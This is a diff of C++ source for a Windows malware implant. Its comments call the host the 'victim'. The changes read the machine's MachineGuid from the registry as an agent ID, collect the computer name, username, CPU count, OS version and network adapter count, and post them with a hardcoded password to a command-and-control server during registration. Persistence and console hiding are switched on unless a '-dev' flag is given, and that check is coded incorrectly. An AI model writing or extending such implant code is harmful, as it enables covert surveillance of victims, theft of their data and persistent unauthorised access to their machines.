@@ -32,6 +32,14 @@ std::string password = "magic_conch";
 std::string agentId;
 DWORD sleepTime = 10 * 1000;
 
+void printHex(std::string str) {
+    const char* ptStr = str.data();
+    for (int i = 0; i < str.size(); i++) {
+        printf("%x ", ptStr[i]);
+    }
+    printf("\n");
+}
+
 // find the name of victim computer
 std::string getComputerName() {
 
@@ -92,14 +100,21 @@ std::string getWindowsVer() {
 
 //find the victim's profile id
 std::string getProfileID() {
-    std::string res;
-    char *buf = (char *) malloc(BUF_SIZE);
+    BYTE lpData[255];
+    DWORD cbData = 255;
+
+    HKEY regKey = (HKEY)0x0;
+    RegOpenKeyExA((HKEY)HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Cryptography", 0, 0x20119, &regKey);
+
+    // set registry value
+    RegQueryValueExA(regKey,"MachineGuid",(LPDWORD)0x0,(LPDWORD)0x0, lpData, &cbData);
     
-    std::string name = "WT_PROFILE_ID";
-    GetEnvironmentVariableA(&name[0], buf, DWORD(BUF_SIZE));
-    
-    res.append(buf);
-    return res;
+    // close key handle
+    RegCloseKey(regKey);
+
+    std::string guid((char*) lpData, (int) cbData-10);
+
+    return guid;
 }
 
 // find number of processors in the victim machine
@@ -149,16 +164,30 @@ std::string getNetworkInterfaceNum() {
 
 // register the agent on the c2 server
 BOOL registerAgent() {
+
+    // printHex(agentId);
+    // printHex(getComputerName());
+    // printHex(getUserName());
+    // printHex(getCPUNum());
+    // printHex(getWindowsVer());
+    // printHex(getNetworkInterfaceNum());
+
+    // std::cout << agentId << std::endl;
+    // std::cout << getComputerName() << std::endl;
+    // std::cout << getUserName() << std::endl;
+    // std::cout << getCPUNum() << std::endl;
+    // std::cout << getWindowsVer() << std::endl;
+    // std::cout << getNetworkInterfaceNum() << std::endl;
     
     json jsonPayload = {
-        {"agent_id", getProfileID()},
+        {"agent_id", agentId},
         {"whoami", getComputerName()},
         {"username", getUserName()},
         {"password", password},
         {"cpus", getCPUNum()},
         {"osVersion", getWindowsVer()},
         {"adaptors", getNetworkInterfaceNum()}
-    };
+    }; 
 
     std::string jsonString = jsonPayload.dump();
     std::string response = httpPost(c2Domain, port, registerURI, jsonString, useTLS);
@@ -391,9 +420,10 @@ int main(int argc, char* argv[]){
         return 0; // Exit program
     }
 
-    // FreeConsole();
-
-    persist();
+    if (argc != 2 && argv[1] != "-dev") {
+        FreeConsole();
+        persist();
+    }
 
     agentId = getProfileID();
 
